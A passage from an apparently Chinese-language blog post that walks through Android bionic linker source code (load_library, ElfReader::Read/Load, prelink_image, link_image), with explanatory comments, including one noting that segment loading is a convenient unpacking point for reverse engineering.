task-&gt;set_soinfo(candidate);</span><br><span class="line"><span class="number">1441</span>      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">1442</span>    &#125;</span><br><span class="line"><span class="number">1443</span>  </span><br><span class="line"><span class="number">1444</span>    <span class="comment">// Library might still be loaded, the accurate detection</span></span><br><span class="line"><span class="number">1445</span>    <span class="comment">// of this fact is done by load_library.</span></span><br><span class="line"><span class="number">1446</span>    TRACE(<span class="string">&quot;[ \&quot;%s\&quot; find_loaded_library_by_soname failed (*candidate=%s@%p). Trying harder...]&quot;</span>,</span><br><span class="line"><span class="number">1447</span>        task-&gt;get_name(), candidate == nullptr ? <span class="string">&quot;n/a&quot;</span> : candidate-&gt;get_realpath(), candidate);</span><br><span class="line"><span class="number">1448</span>  </span><br><span class="line"><span class="number">1449</span>    <span class="keyword">if</span> (load_library(ns, task, zip_archive_cache, load_tasks, rtld_flags, search_linked_namespaces)) &#123;<span class="comment">//如果不存在，说明还没加载，继续调用load_library 加载so</span></span><br><span class="line"><span class="number">1450</span>      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">1451</span>    &#125;</span><br><span class="line"><span class="number">1452</span>  </span><br><span class="line"><span class="number">1453</span>    <span class="keyword">if</span> (search_linked_namespaces) &#123;</span><br><span class="line"><span class="number">1454</span>      <span class="comment">// if a library was not found - look into linked namespaces</span></span><br><span class="line"><span class="number">1455</span>      <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; linked_namespace : ns-&gt;linked_namespaces()) &#123;</span><br><span class="line"><span class="number">1456</span>        <span class="keyword">if</span> (find_library_in_linked_namespace(linked_namespace,</span><br><span class="line"><span class="number">1457</span>                                             task)) &#123;</span><br><span class="line"><span class="number">1458</span>          <span class="keyword">if</span> (task-&gt;get_soinfo() == nullptr) &#123;</span><br><span class="line"><span class="number">1459</span>            <span class="comment">// try to load the library - once namespace boundary is crossed</span></span><br><span class="line"><span class="number">1460</span>            <span class="comment">// we need to load a library within separate load_group</span></span><br><span class="line"><span class="number">1461</span>            <span class="comment">// to avoid using symbols from foreign namespace while.</span></span><br><span class="line"><span class="number">1462</span>            <span class="comment">//</span></span><br><span class="line"><span class="number">1463</span>            <span class="comment">// However, actual linking is deferred until when the global group</span></span><br><span class="line"><span class="number">1464</span>            <span class="comment">// is fully identified and is applied to all namespaces.</span></span><br><span class="line"><span class="number">1465</span>            <span class="comment">// Otherwise, the libs in the linked namespace won&#x27;t get symbols from</span></span><br><span class="line"><span class="number">1466</span>            <span class="comment">// the global group.</span></span><br><span class="line"><span class="number">1467</span>            <span class="keyword">if</span> (load_library(linked_namespace.linked_namespace(), task, zip_archive_cache, load_tasks, rtld_flags, <span class="literal">false</span>)) &#123;</span><br><span class="line"><span class="number">1468</span>              <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">1469</span>            &#125;</span><br><span class="line"><span class="number">1470</span>            <span class="comment">// lib was not found in the namespace. Try next linked namespace.</span></span><br><span class="line"><span class="number">1471</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">1472</span>            <span class="comment">// lib is already loaded</span></span><br><span class="line"><span class="number">1473</span>            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">1474</span>          &#125;</span><br><span class="line"><span class="number">1475</span>        &#125;</span><br><span class="line"><span class="number">1476</span>      &#125;</span><br><span class="line"><span class="number">1477</span>    &#125;</span><br><span class="line"><span class="number">1478</span>  </span><br><span class="line"><span class="number">1479</span>    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1480</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-12-load-library"><a href="#2-12-load-library" class="headerlink" title="2.12 load_library()"></a>2.12 load_library()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">1311</span>  <span class="type">static</span> <span class="type">bool</span> <span class="title function_">load_library</span><span class="params">(<span class="type">android_namespace_t</span>* ns,</span></span><br><span class="line"><span class="params"><span class="number">1312</span>                           LoadTask* task,</span></span><br><span class="line"><span class="params"><span class="number">1313</span>                           ZipArchiveCache* zip_archive_cache,</span></span><br><span class="line"><span class="params"><span class="number">1314</span>                           LoadTaskList* load_tasks,</span></span><br><span class="line"><span class="params"><span class="number">1315</span>                           <span class="type">int</span> rtld_flags,</span></span><br><span class="line"><span class="params"><span class="number">1316</span>                           <span class="type">bool</span> search_linked_namespaces)</span> &#123;</span><br><span class="line"><span class="number">1317</span>    <span class="type">const</span> <span class="type">char</span>* name = task-&gt;get_name();</span><br><span class="line"><span class="number">1318</span>    soinfo* needed_by = task-&gt;get_needed_by();</span><br><span class="line"><span class="number">1319</span>    <span class="type">const</span> android_dlextinfo* extinfo = task-&gt;get_extinfo();</span><br><span class="line"><span class="number">1320</span>  </span><br><span class="line"><span class="number">1321</span>    <span class="type">off64_t</span> file_offset;</span><br><span class="line"><span class="number">1322</span>    <span class="built_in">std</span>::<span class="built_in">string</span> realpath;</span><br><span class="line"><span class="number">1323</span>    <span class="keyword">if</span> (extinfo != nullptr &amp;&amp; (extinfo-&gt;flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">1324</span>      file_offset = <span class="number">0</span>;</span><br><span class="line"><span class="number">1325</span>      <span class="keyword">if</span> ((extinfo-&gt;flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">1326</span>        file_offset = extinfo-&gt;library_fd_offset;</span><br><span class="line"><span class="number">1327</span>      &#125;</span><br><span class="line"><span class="number">1328</span>  </span><br><span class="line"><span class="number">1329</span>      <span class="keyword">if</span> (!realpath_fd(extinfo-&gt;library_fd, &amp;realpath)) &#123;</span><br><span class="line"><span class="number">1330</span>        PRINT(<span class="string">&quot;warning: unable to get realpath for the library \&quot;%s\&quot; by extinfo-&gt;library_fd. &quot;</span></span><br><span class="line"><span class="number">1331</span>              <span class="string">&quot;Will use given name.&quot;</span>, name);</span><br><span class="line"><span class="number">1332</span>        realpath = name;</span><br><span class="line"><span class="number">1333</span>      &#125;</span><br><span class="line"><span class="number">1334</span>  </span><br><span class="line"><span class="number">1335</span>      task-&gt;set_fd(extinfo-&gt;library_fd, <span class="literal">false</span>);</span><br><span class="line"><span class="number">1336</span>      task-&gt;set_file_offset(file_offset);</span><br><span class="line"><span class="number">1337</span>      <span class="keyword">return</span> load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces);</span><br><span class="line"><span class="number">1338</span>    &#125;</span><br><span class="line"><span class="number">1339</span>  </span><br><span class="line"><span class="number">1340</span>    <span class="comment">// Open the file.</span></span><br><span class="line"><span class="number">1341</span>    <span class="type">int</span> fd = open_library(ns, zip_archive_cache, name, needed_by, &amp;file_offset, &amp;realpath);</span><br><span class="line"><span class="number">1342</span>    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="number">1343</span>      DL_ERR(<span class="string">&quot;library \&quot;%s\&quot; not found&quot;</span>, name);</span><br><span class="line"><span class="number">1344</span>      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1345</span>    &#125;</span><br><span class="line"><span class="number">1346</span>  </span><br><span class="line"><span class="number">1347</span>    task-&gt;set_fd(fd, <span class="literal">true</span>);</span><br><span class="line"><span class="number">1348</span>    task-&gt;set_file_offset(file_offset);</span><br><span class="line"><span class="number">1349</span>  </span><br><span class="line"><span class="number">1350</span>    <span class="keyword">return</span> load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces);</span><br><span class="line"><span class="number">1351</span>  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-13-load-library"><a href="#2-13-load-library" class="headerlink" title="2.13 load_library()"></a>2.13 load_library()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">1178</span>  <span class="type">static</span> <span class="type">bool</span> <span class="title function_">load_library</span><span class="params">(<span class="type">android_namespace_t</span>* ns,</span></span><br><span class="line"><span class="params"><span class="number">1179</span>                           LoadTask* task,</span></span><br><span class="line"><span class="params"><span class="number">1180</span>                           LoadTaskList* load_tasks,</span></span><br><span class="line"><span class="params"><span class="number">1181</span>                           <span class="type">int</span> rtld_flags,</span></span><br><span class="line"><span class="params"><span class="number">1182</span>                           <span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; realpath,</span></span><br><span class="line"><span class="params"><span class="number">1183</span>                           <span class="type">bool</span> search_linked_namespaces)</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">1276</span>    soinfo* si = soinfo_alloc(ns, realpath.c_str(), &amp;file_stat, file_offset, rtld_flags);</span><br><span class="line"><span class="number">1277</span>    <span class="keyword">if</span> (si == nullptr) &#123;</span><br><span class="line"><span class="number">1278</span>      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1279</span>    &#125;</span><br><span class="line"><span class="number">1280</span>  </span><br><span class="line"><span class="number">1281</span>    task-&gt;set_soinfo(si);</span><br><span class="line"><span class="number">1282</span>  </span><br><span class="line"><span class="number">1283</span>    <span class="comment">// Read the ELF header and some of the segments.</span></span><br><span class="line"><span class="number">1284</span>    <span class="keyword">if</span> (!task-&gt;read(realpath.c_str(), file_stat.st_size)) &#123;</span><br><span class="line"><span class="number">1285</span>      soinfo_free(si);</span><br><span class="line"><span class="number">1286</span>      task-&gt;set_soinfo(nullptr);</span><br><span class="line"><span class="number">1287</span>      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1288</span>    &#125;</span><br><span class="line"><span class="number">1289</span>  </span><br><span class="line"><span class="number">1290</span>    <span class="comment">// find and set DT_RUNPATH and dt_soname</span></span><br><span class="line"><span class="number">1291</span>    <span class="comment">// Note that these field values are temporary and are</span></span><br><span class="line"><span class="number">1292</span>    <span class="comment">// going to be overwritten on soinfo::prelink_image</span></span><br><span class="line"><span class="number">1293</span>    <span class="comment">// with values from PT_LOAD segments.</span></span><br><span class="line"><span class="number">1294</span>    <span class="type">const</span> ElfReader&amp; elf_reader = task-&gt;get_elf_reader();</span><br><span class="line"><span class="number">1295</span>    <span class="keyword">for</span> (<span class="type">const</span> ElfW(Dyn)* d = elf_reader.dynamic(); d-&gt;d_tag != DT_NULL; ++d) &#123;</span><br><span class="line"><span class="number">1296</span>      <span class="keyword">if</span> (d-&gt;d_tag == DT_RUNPATH) &#123;</span><br><span class="line"><span class="number">1297</span>        si-&gt;set_dt_runpath(elf_reader.get_string(d-&gt;d_un.d_val));</span><br><span class="line"><span class="number">1298</span>      &#125;</span><br><span class="line"><span class="number">1299</span>      <span class="keyword">if</span> (d-&gt;d_tag == DT_SONAME) &#123;</span><br><span class="line"><span class="number">1300</span>        si-&gt;set_soname(elf_reader.get_string(d-&gt;d_un.d_val));</span><br><span class="line"><span class="number">1301</span>      &#125;</span><br><span class="line"><span class="number">1302</span>    &#125;</span><br><span class="line"><span class="number">1303</span>  </span><br><span class="line"><span class="number">1304</span>    for_each_dt_needed(task-&gt;get_elf_reader(), [&amp;](<span class="type">const</span> <span class="type">char</span>* name) &#123;</span><br><span class="line"><span class="number">1305</span>      load_tasks-&gt;push_back(LoadTask::create(name, si, ns, task-&gt;get_readers_map()));</span><br><span class="line"><span class="number">1306</span>    &#125;);</span><br><span class="line"><span class="number">1307</span>  </span><br><span class="line"><span class="number">1308</span>    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">1309</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-14-read"><a href="#2-14-read" class="headerlink" title="2.14 read()"></a>2.14 read()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">635</span>    <span class="type">bool</span> <span class="title function_">read</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* realpath, <span class="type">off64_t</span> file_size)</span> &#123;</span><br><span class="line"><span class="number">636</span>      ElfReader&amp; elf_reader = get_elf_reader();</span><br><span class="line"><span class="number">637</span>      <span class="keyword">return</span> elf_reader.Read(realpath, fd_, file_offset_, file_size);</span><br><span class="line"><span class="number">638</span>    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-15-ElfReader-Read"><a href="#2-15-ElfReader-Read" class="headerlink" title="2.15 ElfReader::Read()"></a>2.15 ElfReader::Read()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker_phdr.cpp</span></span><br><span class="line"><span class="number">149</span>  <span class="type">bool</span> <span class="title function_">ElfReader::Read</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name, <span class="type">int</span> fd, <span class="type">off64_t</span> file_offset, <span class="type">off64_t</span> file_size)</span> &#123;</span><br><span class="line"><span class="number">150</span>    <span class="keyword">if</span> (did_read_) &#123;</span><br><span class="line"><span class="number">151</span>      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">152</span>    &#125;</span><br><span class="line"><span class="number">153</span>    name_ = name;</span><br><span class="line"><span class="number">154</span>    fd_ = fd;</span><br><span class="line"><span class="number">155</span>    file_offset_ = file_offset;</span><br><span class="line"><span class="number">156</span>    file_size_ = file_size;</span><br><span class="line"><span class="number">157</span>  </span><br><span class="line"><span class="number">158</span>    <span class="keyword">if</span> (ReadElfHeader() &amp;&amp;<span class="comment">//读elf文件头</span></span><br><span class="line"><span class="number">159</span>        VerifyElfHeader() &amp;&amp;<span class="comment">//校验elf文件头</span></span><br><span class="line"><span class="number">160</span>        ReadProgramHeaders() &amp;&amp;<span class="comment">//读程序头表</span></span><br><span class="line"><span class="number">161</span>        ReadSectionHeaders() &amp;&amp;<span class="comment">//读节头表</span></span><br><span class="line"><span class="number">162</span>        ReadDynamicSection()) &#123;<span class="comment">//读动态节区</span></span><br><span class="line"><span class="number">163</span>      did_read_ = <span class="literal">true</span>;</span><br><span class="line"><span class="number">164</span>    &#125;</span><br><span class="line"><span class="number">165</span>  </span><br><span class="line"><span class="number">166</span>    <span class="keyword">return</span> did_read_;</span><br><span class="line"><span class="number">167</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-16-load"><a href="#2-16-load" class="headerlink" title="2.16 load()"></a>2.16 load()</h2><p>回调到<code>find_libraries()</code>，继续往下执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">640</span>    <span class="type">bool</span> <span class="title function_">load</span><span class="params">()</span> &#123;<span class="comment">//装载so，并给soInfo结构体赋值</span></span><br><span class="line"><span class="number">641</span>      ElfReader&amp; elf_reader = get_elf_reader();</span><br><span class="line"><span class="number">642</span>      <span class="keyword">if</span> (!elf_reader.Load(extinfo_)) &#123;</span><br><span class="line"><span class="number">643</span>        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">644</span>      &#125;</span><br><span class="line"><span class="number">645</span>  </span><br><span class="line"><span class="number">646</span>      si_-&gt;base = elf_reader.load_start();</span><br><span class="line"><span class="number">647</span>      si_-&gt;size = elf_reader.load_size();</span><br><span class="line"><span class="number">648</span>      si_-&gt;set_mapped_by_caller(elf_reader.is_mapped_by_caller());</span><br><span class="line"><span class="number">649</span>      si_-&gt;load_bias = elf_reader.load_bias();</span><br><span class="line"><span class="number">650</span>      si_-&gt;phnum = elf_reader.phdr_count();</span><br><span class="line"><span class="number">651</span>      si_-&gt;phdr = elf_reader.loaded_phdr();</span><br><span class="line"><span class="number">652</span>  </span><br><span class="line"><span class="number">653</span>      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">654</span>    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-17-ElfReader-Load"><a href="#2-17-ElfReader-Load" class="headerlink" title="2.17 ElfReader::Load()"></a>2.17 ElfReader::Load()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker_phdr.cpp</span></span><br><span class="line"><span class="number">169</span>  <span class="type">bool</span> <span class="title function_">ElfReader::Load</span><span class="params">(<span class="type">const</span> android_dlextinfo* extinfo)</span> &#123;</span><br><span class="line"><span class="number">170</span>    CHECK(did_read_);</span><br><span class="line"><span class="number">171</span>    <span class="keyword">if</span> (did_load_) &#123;</span><br><span class="line"><span class="number">172</span>      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">173</span>    &#125;</span><br><span class="line"><span class="number">174</span>    <span class="keyword">if</span> (ReserveAddressSpace(extinfo) &amp;&amp;<span class="comment">//为段开辟内存空间</span></span><br><span class="line"><span class="number">175</span>        LoadSegments() &amp;&amp;<span class="comment">//加载段，这里是很好的脱壳点</span></span><br><span class="line"><span class="number">176</span>        FindPhdr()) &#123;<span class="comment">//设置程序的加载地址</span></span><br><span class="line"><span class="number">177</span>      did_load_ = <span class="literal">true</span>;</span><br><span class="line"><span class="number">178</span>    &#125;</span><br><span class="line"><span class="number">179</span>  </span><br><span class="line"><span class="number">180</span>    <span class="keyword">return</span> did_load_;</span><br><span class="line"><span class="number">181</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-18-soinfo-prelink-image"><a href="#2-18-soinfo-prelink-image" class="headerlink" title="2.18 soinfo::prelink_image()"></a>2.18 soinfo::prelink_image()</h2><p>继续回调到<code>find_libraries()</code>。<code>soinfo::prelink_image()</code>函数的作用是解析linker文件中dynamic段的各项，例如重定位表，符号表。它大都是switch…case…结构，根据不同的tag做不同的解析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">2864</span>  <span class="type">bool</span> <span class="title function_">soinfo::prelink_image</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="number">2865</span>    <span class="comment">/* Extract dynamic section */</span></span><br><span class="line"><span class="number">2866</span>    ElfW(Word) dynamic_flags = <span class="number">0</span>;</span><br><span class="line"><span class="number">2867</span>    phdr_table_get_dynamic_section(phdr, phnum, load_bias, &amp;dynamic, &amp;dynamic_flags);</span><br><span class="line">...</span><br><span class="line"><span class="number">2897</span>    <span class="type">uint32_t</span> needed_count = <span class="number">0</span>;</span><br><span class="line"><span class="number">2898</span>    <span class="keyword">for</span> (ElfW(Dyn)* d = dynamic; d-&gt;d_tag != DT_NULL; ++d) &#123;</span><br><span class="line"><span class="number">2899</span>      DEBUG(<span class="string">&quot;d = %p, d[0](tag) = %p d[1](val) = %p&quot;</span>,</span><br><span class="line"><span class="number">2900</span>            d, reinterpret_cast&lt;<span class="type">void</span>*&gt;(d-&gt;d_tag), reinterpret_cast&lt;<span class="type">void</span>*&gt;(d-&gt;d_un.d_val));</span><br><span class="line"><span class="number">2901</span>      <span class="keyword">switch</span> (d-&gt;d_tag) &#123;</span><br><span class="line"><span class="number">2902</span>        <span class="keyword">case</span> DT_SONAME:</span><br><span class="line"><span class="number">2903</span>          <span class="comment">// this is parsed after we have strtab initialized (see below).</span></span><br><span class="line"><span class="number">2904</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">2905</span>  </span><br><span class="line"><span class="number">2906</span>        <span class="keyword">case</span> DT_HASH:</span><br><span class="line"><span class="number">2907</span>          nbucket_ = reinterpret_cast&lt;<span class="type">uint32_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr)[<span class="number">0</span>];</span><br><span class="line"><span class="number">2908</span>          nchain_ = reinterpret_cast&lt;<span class="type">uint32_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr)[<span class="number">1</span>];</span><br><span class="line"><span class="number">2909</span>          bucket_ = reinterpret_cast&lt;<span class="type">uint32_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr + <span class="number">8</span>);</span><br><span class="line"><span class="number">2910</span>          chain_ = reinterpret_cast&lt;<span class="type">uint32_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr + <span class="number">8</span> + nbucket_ * <span class="number">4</span>);</span><br><span class="line"><span class="number">2911</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">2912</span>  </span><br><span class="line"><span class="number">2913</span>        <span class="keyword">case</span> DT_GNU_HASH:</span><br><span class="line"><span class="number">2914</span>          gnu_nbucket_ = reinterpret_cast&lt;<span class="type">uint32_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr)[<span class="number">0</span>];</span><br><span class="line"><span class="number">2915</span>          <span class="comment">// skip symndx</span></span><br><span class="line"><span class="number">2916</span>          gnu_maskwords_ = reinterpret_cast&lt;<span class="type">uint32_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr)[<span class="number">2</span>];</span><br><span class="line"><span class="number">2917</span>          gnu_shift2_ = reinterpret_cast&lt;<span class="type">uint32_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr)[<span class="number">3</span>];</span><br><span class="line"><span class="number">2918</span>  </span><br><span class="line"><span class="number">2919</span>          gnu_bloom_filter_ = reinterpret_cast&lt;ElfW(Addr)*&gt;(load_bias + d-&gt;d_un.d_ptr + <span class="number">16</span>);</span><br><span class="line"><span class="number">2920</span>          gnu_bucket_ = reinterpret_cast&lt;<span class="type">uint32_t</span>*&gt;(gnu_bloom_filter_ + gnu_maskwords_);</span><br><span class="line"><span class="number">2921</span>          <span class="comment">// amend chain for symndx = header[1]</span></span><br><span class="line"><span class="number">2922</span>          gnu_chain_ = gnu_bucket_ + gnu_nbucket_ -</span><br><span class="line"><span class="number">2923</span>              reinterpret_cast&lt;<span class="type">uint32_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr)[<span class="number">1</span>];</span><br><span class="line"><span class="number">2924</span>  </span><br><span class="line"><span class="number">2925</span>          <span class="keyword">if</span> (!powerof2(gnu_maskwords_)) &#123;</span><br><span class="line"><span class="number">2926</span>            DL_ERR(<span class="string">&quot;invalid maskwords for gnu_hash = 0x%x, in \&quot;%s\&quot; expecting power to two&quot;</span>,</span><br><span class="line"><span class="number">2927</span>                gnu_maskwords_, get_realpath());</span><br><span class="line"><span class="number">2928</span>            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">2929</span>          &#125;</span><br><span class="line"><span class="number">2930</span>          --gnu_maskwords_;</span><br><span class="line"><span class="number">2931</span>  </span><br><span class="line"><span class="number">2932</span>          flags_ |= FLAG_GNU_HASH;</span><br><span class="line"><span class="number">2933</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">2934</span>  </span><br><span class="line"><span class="number">2935</span>        <span class="keyword">case</span> DT_STRTAB:</span><br><span class="line"><span class="number">2936</span>          strtab_ = reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(load_bias + d-&gt;d_un.d_ptr);</span><br><span class="line"><span class="number">2937</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">2938</span>  </span><br><span class="line"><span class="number">2939</span>        <span class="keyword">case</span> DT_STRSZ:</span><br><span class="line"><span class="number">2940</span>          strtab_size_ = d-&gt;d_un.d_val;</span><br><span class="line"><span class="number">2941</span>          <span class="keyword">break</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="2-19-soinfo-link-image"><a href="#2-19-soinfo-link-image" class="headerlink" title="2.19 soinfo::link_image()"></a>2.19 soinfo::link_image()</h2><p>继续回调<code>find_libraries()</code>，解析完后就是重定位了，<code>soinfo::link_image()</code>的作用是修复内存中的数据，完成重定位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">3303</span>  <span class="type">bool</span> <span class="title function_">soinfo::link_image</span><span class="params">(<span class="type">const</span> <span class="type">soinfo_list_t</span>&amp; global_group, <span class="type">const</span> <span class="type">soinfo_list_t</span>&amp; local_group,</span></span><br><span class="line"><span class="params"><span class="number">3304</span>                          <span class="type">const</span> android_dlextinfo* extinfo)</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">3344</span>    <span class="keyword">if</span> (android_relocs_ != nullptr) &#123;</span><br><span class="line"><span class="number">3345</span>      <span class="comment">// check signature</span></span><br><span class="line"><span class="number">3346</span>      <span class="keyword">if</span> (android_relocs_size_ &gt; <span class="number">3</span> &amp;&amp;</span><br><span class="line"><span class="number">3347</span>          android_relocs_[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp;</span><br><span class="line"><span 